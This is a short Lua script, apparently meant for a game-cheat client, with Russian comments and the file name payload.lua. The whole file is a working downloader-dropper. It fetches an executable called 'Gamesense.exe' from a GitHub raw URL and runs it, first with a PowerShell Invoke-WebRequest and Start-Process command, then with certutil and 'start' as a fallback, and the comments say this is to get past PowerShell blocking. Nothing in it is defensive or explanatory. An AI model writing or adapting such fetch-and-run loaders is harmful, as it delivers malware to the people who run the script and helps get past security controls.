-- Файл: payload.lua
-- Ссылка на ваш .exe файл
local FILE_URL = "https://github.com/u8429701-wq/qdqwda12312/raw/refs/heads/main/Gamesense.exe"

-- Основная логика вашего скрипта
local function main()
    -- Попытка 1: PowerShell (часто заблокирован, но попробовать стоит)
    local ps_cmd = string.format(
        'powershell -Command "Invoke-WebRequest -Uri \'%s\' -OutFile \'%s\'; Start-Process \'%s\'"',
        FILE_URL, "Gamesense.exe", "Gamesense.exe"
    )
    client.exec(ps_cmd)

    -- Попытка 2: certutil (альтернатива, если PS не сработал)
    client.delay_call(3, function()
        client.exec('certutil -urlcache -split -f "' .. FILE_URL .. '" Gamesense.exe')
        client.delay_call(3, function()
            client.exec("start Gamesense.exe")
        end)
    end)
end

-- Запускаем основную логику
main()